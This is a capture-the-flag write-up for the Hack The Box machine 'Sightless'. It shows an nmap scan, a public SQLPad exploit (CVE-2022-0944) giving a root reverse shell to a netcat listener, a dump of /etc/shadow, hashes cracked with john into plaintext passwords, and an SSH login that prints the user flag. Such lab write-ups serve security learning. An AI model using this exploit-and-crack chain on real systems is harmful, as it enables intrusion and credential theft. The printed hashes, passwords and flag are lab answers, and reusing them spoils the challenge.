
![](Pasted%20image%2020241020223114.png)
[more](https://app.hackthebox.com/machines/Sightless)

# Recon

- Nmap scan

> nmap -sCSV -T4 $ip
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 01:36 AEDT
Nmap scan report for 10.10.11.32 (10.10.11.32)
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=10/20%Time=6713C3F1%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
SF:x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
```

- checking http://sightless.htb
- fond http://sqlpad.sightless.htb/

# Vulnerability Discovery

- fond vulnerability in sqlpad - [here](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)
- found more info about the vulnerability - [here](https://github.com/shhrew/CVE-2022-0944?tab=readme-ov-file)

# Exploitation

> python3 main.py http://sqlpad.sightless.htb/ 10.10.16.30 9999            
```
[┤] Trying to bind to 10.10.16.30 on port 9999: Trying 10.10.16.30
Exception in thread Thread-1 (start_listener):
Traceback (most recent call last):
  File "/usr/lib/python3.12/threading.py", line 1075, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.12/threading.py", line 1012, in run
    self._target(*self._args, **self._kwargs)
  File "/home/lnxuser/ctfs/CVE-2022-0944/main.py", line 72, in start_listener
    listener = listen(lport, bindaddr=lhost)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/lnxuser/ctfs/CVE-2022-0944/venv/lib/python3.12/site-packages/pwnlib/tubes/listen.py", line 108, in __init__
    listen_sock.bind(self.sockaddr)
OSError: [Errno 98] Address already in use

```

>  nc -vlnp 9999
```
listening on [any] 9999 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.11.32] 37106
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

# Post-Exploitation

- checking /etc/shadow file

> cat /etc/shadow
```
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

- seems like user flags can be cracked by john the ripper
- store michael and root line in hash.txt and use john

> john hash.txt -w=/usr/share/wordlists/rockyou.txt    
```
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blindside        (root)     
insaneclownposse (michael)     
2g 0:00:00:06 DONE (2024-10-20 03:21) 0.3322g/s 10205p/s 17009c/s 17009C/s XIOMARA..sinead1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

# CTUF 

- after ssh-ing michael I found the user flag

> ssh michael@10.10.11.32 
```        
michael@10.10.11.32's password: 
Last login: Sat Oct 19 16:24:49 2024 from 10.10.16.31
michael@sightless:~$ ls
exploit.py  linpease.sh  new  README  result.txt  user.txt
michael@sightless:~$ cat user.txt 
4e365dc2a4a1350b73e96c3e232fe9e2
```

# Privilege Escalation

- TBD